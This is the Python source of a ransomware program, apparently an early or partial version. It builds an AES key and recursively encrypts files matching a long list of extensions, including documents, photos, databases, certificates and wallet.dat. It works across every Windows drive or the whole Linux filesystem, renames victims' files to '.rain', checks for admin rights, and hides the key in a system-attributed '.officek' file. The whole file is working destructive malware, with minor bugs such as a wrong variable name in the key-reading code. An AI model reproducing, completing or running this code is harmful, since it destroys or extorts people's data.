import os,platform,glob,sys,string
from os import system as sis
from Crypto.Cipher import AES
from Crypto import Random

BLOCK_SIZE = 32
s = platform.system()
k = Random.new().read(BLOCK_SIZE)
aes = AES.new(k,AES.MODE_ECB)
drives = list(string.ascii_uppercase)

ext=['*.php','*.pl','*.7z','*.rar','*.m4a','*.wma','*.avi','*.wmv','*.csv','*.d3dbsp','*.sc2save','*.sie','*.sum','*.ibank','*.t13','*.t12','*.qdf','*.gdb','*.tax'
,'*.pkpass','*.bc6','*.bc7','*.bkp','*.qic','*.bkf','*.sidn','*.sidd','*.mddata','*.itl','*.itdb','*.icxs','*.hvpl','*.hplg','*.hkdb','*.mdbackup','*.syncdb','*.gho'
,'*.cas','*.svg','*.map','*.wmo','*.itm','*.sb','*.fos','*.mcgame','*.vdf','*.ztmp','*.sis','*.sid','*.ncf','*.menu','*.layout','*.dmp','*.blob','*.esm','*.001'
,'*.vtf','*.dazip','*.fpk','*.mlx','*.kf','*.iwd','*.vpk','*.tor','*.psk','*.rim','*.w3x','*.fsh','*.ntl','*.arch00','*.lvl','*.snx','*.cfr','*.ff','*.vpp_pc','*.lrf'
,'*.m2','*.mcmeta','*.vfs0','*.mpqge','*.kdb','*.db0','*.mp3','*.upx','*.rofl','*.hkx','*.bar','*.upk','*.das','*.iwi','*.litemod','*.asset','*.forge','*.ltx','*.bsa'
,'*.apk','*.re4','*.sav','*.lbf','*.slm','*.bik','*.epk','*.rgss3a','*.pak','*.big','*.unity3d','*.wotreplay','*.xxx','*.desc','*.py','*.m3u','*.flv','*.js','*.css'
,'*.rb','*.png','*.jpeg','*.p7c','*.p7b','*.p12','*.pfx','*.pem','*.crt','*.cer','*.der','*.x3f','*.srw','*.pef','*.ptx','*.r3d','*.rw2','*.rwl','*.raw','*.raf'
,'*.orf','*.nrw','*.mrwref','*.mef','*.erf','*.kdc','*.dcr','*.cr2','*.crw','*.bay','*.sr2','*.srf','*.arw','*.3fr','*.dng','*.jpeg','*.jpg','*.cdr','*.indd','*.ai'
,'*.eps','*.pdf','*.pdd','*.psd','*.dbfv','*.mdf','*.wb2','*.rtf','*.wpd','*.dxg','*.xf','*.dwg','*.pst','*.accdb','*.mdb','*.pptm','*.pptx','*.ppt','*.xlk','*.xlsb'
,'*.xlsm','*.xlsx','*.xls','*.wps','*.docm','*.docx','*.doc','*.odb','*.odc','*.odm','*.odp','*.ods','*.odt','*.sql','*.zip','*.tar','*.tar.gz','*.tgz','*.biz','*.ocx'
,'*.html','*.htm','*.3gp','*.srt','*.cpp','*.mid','*.mkv','*.mov','*.asf','*.mpeg','*.vob','*.mpg','*.fla','*.swf','*.wav','*.qcow2','*.vdi','*.vmdk','*.vmx','*.gpg'
,'*.aes','*.ARC','*.PAQ','*.tar.bz2','*.tbk','*.bak','*.djv','*.djvu','*.bmp','*.cgm','*.tif','*.tiff','*.NEF','*.cmd','*.class','*.jar','*.java','*.asp','*.brd'
,'*.sch','*.dch','*.dip','*.vbs','*.asm','*.pas','*.ldf','*.ibd','*.MYI','*.MYD','*.frm','*.dbf','*.SQLITEDB','*.SQLITE3','*.asc','*.lay6','*.lay','*.ms11 (Security copy)'
,'*.sldm','*.sldx','*.ppsm','*.ppsx','*.ppam','*.docb','*.mml','*.sxm','*.otg','*.slk','*.xlw','*.xlt','*.xlm','*.xlc','*.dif','*.stc','*.sxc','*.ots','*.ods','*.hwp'
,'*.dotm','*.dotx','*.docm','*.DOT','*.max','*.xml','*.uot','*.stw','*.sxw','*.ott','*.csr','*.key','wallet.dat','*.veg','*.application','*.lnk','*.bitmap','*.gif'
,'*.chc','*.ogg','*.json','*.real','*.xz','*.nrg','*.xvf','*.xvfz','*.tmp','*.sublime-package','*.img','*.bg2','*.qxd','*.new','*.ico','*.pps','*.pic','*.iso','*.rm'
,'*.dxf','*.so','*.appref-ms','*.desktop','*.list']

class Crypt:
	"""
	Class containing the methods used for encryption
	"""
	def crypt(file):
		"""
		Encrypt a file
		"""
		try:
			with open(file,'rb') as f:
				f = f.read()
				correct = f+b'#'*(16-len(f)%16)
				cifdata = aes.encrypt(correct)
			with open(file,'wb') as cifile:
				cifile.write((os.path.splitext(file)[1].strip('.')+'.').encode()+cifdata)
			ne = os.path.splitext(file)[0]
			os.rename(file,ne+".rain")
		except:
			pass


	def c_iterator(dirct):
		#An iterator that uses glob to search for files with pre-defined extensions and encrypt them
		for i in ext:
			iterator = glob.iglob(dirct+'/**/'+i,recursive=True)
			for file in iterator:
					Crypt.crypt(file)

	def infectall():
		"""
		Once you have encrypted the three main directories using "c_iterator" this function is used, 
		which encrypts the rest of the entire disk and ,in Windows, 
		searches for the drives inserted in the machine and continues the process
		"""
		if s=='Windows':
			for drive in drives:
				drive = drive+':/'
				for e in ext:
					iterator = glob.iglob(drive+'/**/'+e,recursive=True)
					for file in iterator:
						Crypt.crypt(file)
		elif s=='Linux':
			for e in ext:
				iterator = glob.iglob('//**/'+e,recursive=True)
				for file in iterator:
					Crypt.crypt(file)

	def resource_path(relative_path):
		"""
		Here is just a fix so there are no compile errors with certain libraries
		"""
		if hasattr(sys, '_MEIPASS'):
			return os.path.join(sys._MEIPASS, relative_path)
		return os.path.join(os.path.abspath("."), relative_path)

	def check_if_is_admin():
		"""
		Check if the program was run with administrative powers.
		"""
		if s=='Windows':
			try:
				with open(r'C:\Windows\System32\cap','wb') as f:
					f.write('isornot'.encode())
			except PermissionError:
				return False
			os.remove(r'C:\Windows\System32\cap')
			return True
		elif s=='Linux':
			if(os.getuid()==0):
				return True
			else:
				return False

	def check_w_key(documents,documentos=os.path.expanduser('~/Documentos')):
		"""
		This method in particular ensures the functionality of subsequent decryption.
		Basically it checks if a key has already been generated for that computer by reading the saved key files.
		This helps to ensure that a new key is not created when the machine is restarted and the new one is lost.
		Maybe it would be much better just to save in a text file a "0" state for key saved or know what to do all that code.
		Forgive me. I need help.
		"""
		global k
		if s=='Windows':
			try:
				try:
					with open(documents+'/.officek','rb') as okey:
						ok = okey.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open(documents+'/.officek','wb') as key:
								key.write(k)
							sis('cd '+documents)
							sis('attrib +s +h '+documents+'/.officek')
						except:
							pass
				except:
					try:
						with open(documents+'/.officek','wb') as key:
							key.write(k)
						sis('cd '+documents)
						sis('attrib +s +h '+documents+'/.officek')
					except:
						pass
			except:
				try:
					with open('C:/Users/Public/.officek','rb') as okey:
						ok = okey.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open('C:/Users/Public/.officek','wb') as key:
								key.write(k)
							sis('cd C:/Users/Public')
							sis('attrib +s +h C:/Users/Public/.officek')
						except:
							pass
				except:
					try:
						with open('C:/Users/Public/.officek','wb') as key:
							key.write(k)
						sis('cd C:/Users/Public')
						sis('attrib +s +h C:/Users/Public/.officek')
					except:
						pass
		elif s=='Linux':
			try:
				try:
					with open(documents+'/.officek','rb') as okey:
						ok = okey.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open(documents+'/.officek','wb') as key:
								key.write(k)
						except:
							pass
				except:
					try:
						with open(documents+'/.officek','wb') as key:
							key.write(k)
					except:
						pass
			except:
				try:
					with open(documentos+'/.officek','rb') as okey:
						ok = key.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open(documentos+'/.oficcek','wb') as key:
								key.write(k)
						except:
							pass
				except:
					try:
						with open(documentos+'/.oficcek','wb') as key:
							key.write(k)
					except:
						pass